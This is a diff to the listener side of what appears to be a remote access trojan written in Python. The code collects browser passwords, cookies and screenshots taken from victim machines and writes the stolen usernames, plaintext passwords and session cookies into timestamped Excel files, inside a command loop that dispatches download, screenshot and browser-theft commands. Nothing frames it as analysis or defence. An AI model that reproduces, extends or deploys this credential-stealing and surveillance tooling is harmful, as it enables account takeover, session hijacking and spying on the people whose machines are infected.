@@ -48,15 +48,15 @@ class Listener:
             return base64.b64encode(binary_data).decode("utf-8")
     
     def create_excel(self,data,type):
+        current_time=datetime.datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
         if type=="passwords":
-            df=pd.DataFrame(data,columns=["browser_name","url",'username','password'])
-            # df.to_csv('passwords.')
-            df.to_excel("password.xlsx",index=False)
-            return "[+] Passwords Downloaded Successfully"
+            df=pd.DataFrame(data["passwords"],columns=["browser_name","url",'username','password'])
+            df.to_excel(r"downloads\password"+current_time+".xlsx",index=False)
+            return "[+] Passwords Downloaded Successfully\n"+"Errors:"+str(data["errors"])
         elif type=="cookies":
-            df=pd.DataFrame(data,columns=["browser_name","host_key",'name','cookie','creation_utc','last_access_utc','expires_utc'])
-            df.to_excel("cookies.xlsx",index=False)
-            return '[+] Cookies Download Suceessfully'
+            df=pd.DataFrame(data["cookies"],columns=["browser_name","host_key",'name','cookie','creation_utc','last_access_utc','expires_utc'])
+            df.to_excel(r"downloads\cookies"+current_time+".xlsx",index=False)
+            return '[+] Cookies Download Suceessfully\n'+"Errors:"+str(data["errors"])
         return data 
     
     def control_bakara(self):
@@ -75,7 +75,7 @@ class Listener:
                     result=self.write_file(command[1],result.encode())
                 elif command[0]=="screenshot":
                     current_time=datetime.datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
-                    result=self.write_file("screenshot"+current_time+".png",result.encode())
+                    result=self.write_file(r"downloads\screenshot"+current_time+".png",result.encode())
                 elif command[0]=="browser":
                     result=self.create_excel(result,command[1])
             except Exception as e:
